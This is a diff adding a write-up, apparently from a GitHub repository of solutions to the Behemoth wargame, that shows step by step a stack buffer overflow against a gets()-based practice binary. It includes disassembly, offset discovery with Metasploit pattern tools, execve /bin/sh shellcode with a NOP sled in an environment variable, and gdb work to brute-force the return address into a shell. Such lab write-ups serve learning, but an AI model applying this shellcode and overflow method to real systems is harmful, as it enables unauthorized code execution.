@@ -231,6 +231,129 @@ $ cat /etc/behemoth_pass/behemoth1
 ```
 ## Behemoth1
 
+Here we exploit a basic bufferoverflow. In sum, we want to overwrite EIP's address, so when return command is executed, we land in our shellcode and get the shell.
+Looking at the code:
+```
+   0x0804844b <+0>:	push   %ebp
+   0x0804844c <+1>:	mov    %esp,%ebp
+   0x0804844e <+3>:	sub    $0x44,%esp
+   0x08048451 <+6>:	push   $0x8048500
+   0x08048456 <+11>:	call   0x8048300 <printf@plt>
+   0x0804845b <+16>:	add    $0x4,%esp
+   0x0804845e <+19>:	lea    -0x43(%ebp),%eax
+   0x08048461 <+22>:	push   %eax
+   0x08048462 <+23>:	call   0x8048310 <gets@plt>
+   0x08048467 <+28>:	add    $0x4,%esp
+   0x0804846a <+31>:	push   $0x804850c
+   0x0804846f <+36>:	call   0x8048320 <puts@plt>
+   0x08048474 <+41>:	add    $0x4,%esp
+   0x08048477 <+44>:	mov    $0x0,%eax
+   0x0804847c <+49>:	leave  
+   0x0804847d <+50>:	ret 
+   
+```
+We can see that we have a very simple program that get's our input and prints it. It uses a very old and insecure function 'gets'. Reading it's manual (man gets) will let us know that nobody should EVER use this functoin, as it's insecure.
+Anyway, we want to know how much we have to go into the stack until we overwrite the return address. We can use Kali's pattern create for this:
+```
+root@kali:~# msf-pattern_create -l 150
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+```
+now we want to put this input into our program being executed in gdb:
+```
+(gdb) r
+Starting program: /behemoth/behemoth1 
+Password: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
+Authentication failure.
+Sorry.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x34634133 in ?? ()
+```
+Now we use pattern_offset to know the input's length:
+```
+root@kali:~# msf-pattern_offset -q 0x34634133
+[*] Exact match at offset 71
+```
+Okay, the length of the payload should be 71 + 4 bytes for the address we want to jump into. Now, let's craft our payload. We want to use NOP's slide, because usually the memory is mapped slightly different, so we can guarantee that we will land somewhere in our payload. Disclaimer: I won't put my shellcode inside the input itself, because for some reason, my shellcode overwrites itself / never lands in the correct address. Therefore, there is a better technique to do this: put the shellcode inside an environment variable. This way, we are not limited by the size of the input, thus increasing our chance to land into our shellcode. So in sum up:
+1) we will craft a shellcode with a lot's of NOP's in a special environmental variable. 
+2) get the address of the environmental variable
+3) send an input of 71 chars + the address of the environ
+4) we should get our shell
+
+Using shell-storm, we get a basic shell in a size of 25 bytes: http://shell-storm.org/shellcode/files/shellcode-585.php
+Now we set our environ;
+```
+behemoth1@behemoth:/tmp/intersys$ export EGG=$(python -c "print('\x90'*1000+'\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68')")
+behemoth1@behemoth:/tmp/intersys$ $EGG
+-bash: �����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
+             [1�1�1Ұ
+                    �����/bin/sh: File name too long
+```
+Great. I tried to write a .c program printing the address of EGG, but it seems that the address is not aligned. We can fix that by using a special scripts (can find them on the interwebz), but I didn't do that here, so we are basically going to find EGG'S address by trial and error. First, we want to know where gdb load's the environ (gdb will usually load it in a different address, but not that far from the actual one):
+```
+
+(gdb) b main
+Breakpoint 1 at 0x8048451
+(gdb) r
+Starting program: /behemoth/behemoth1
+
+Breakpoint 1, 0x08048451 in main ()
+(gdb) x/s *((char**)environ)
+0xffffd48d:	"LC_ALL=en_US.UTF-8"
+(gdb) x/s *((char**)environ+0)
+0xffffd48d:	"LC_ALL=en_US.UTF-8"
+(gdb) x/s *((char**)environ+1)
+0xffffd4a0:	"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...
+(gdb) x/s *((char**)environ+2)
+0xffffda5c:	"SSH_CONNECTION=132.68.40.2 55032 192.168.101.70 22"
+(gdb) x/s *((char**)environ+3)
+0xffffda8f:	"EGG=", '\220' <repeats 196 times>...
+(gdb) x/s *((char**)environ+3)
+0xffffda8f:	"EGG=", '\220' <repeats 196 times>...
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 29292] will be killed.
+
+Quit anyway? (y or n) y
+
+```
+Okay, it's loaded in '0xffffda8f'. Now we want to craft our input:
+```
+behemoth1@behemoth:/behemoth$ python -c "print('a'*71+'\x8f\xda\xff\xff')" | ./behemoth1
+Password: Authentication failure.
+Sorry.
+Segmentation fault
+```
+seg fault means that we missed our EGG's address, thus trying to run an illigal instruction.  Let's try to go a bit up in our address:
+```
+behemoth1@behemoth:/behemoth$ python -c "print('a'*71+'\x7f\xda\xff\xff')" | ./behemoth1
+Password: Authentication failure.
+Sorry.
+Segmentation fault
+```
+Not there yet. 
+```
+behemoth1@behemoth:/behemoth$ (python -c "print('a'*71+'\x6f\xda\xff\xff')") | ./behemoth1
+Password: Authentication failure.
+Sorry.
+```
+Great, we hit it. It seems that the shell is closed immediately. We will use cat in ordered to keep it alive:
+```
+behemoth1@behemoth:/behemoth$ (python -c "print('a'*71+'\x6f\xda\xff\xff')";cat) | ./behemoth1
+Password: Authentication failure.
+Sorry.
+whoami
+behemoth2
+cat /etc/behemoth_pass/behemoth1
+cat: /etc/behemoth_pass/behemoth1: Permission denied
+cat /etc/behemoth_pass/behemoth2                         
+*********
+```
+Okay, so we have the password. Usually, we don't need to do this so manually, there are scripts that align gdb's address. Moreover, we can try to jump in the middle of our NOP's slide in our environmental varible. 
+
+## Behemoth2
+
 
 
 You can use the [editor on GitHub](https://github.com/int3rsys/behemoth-solutions/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
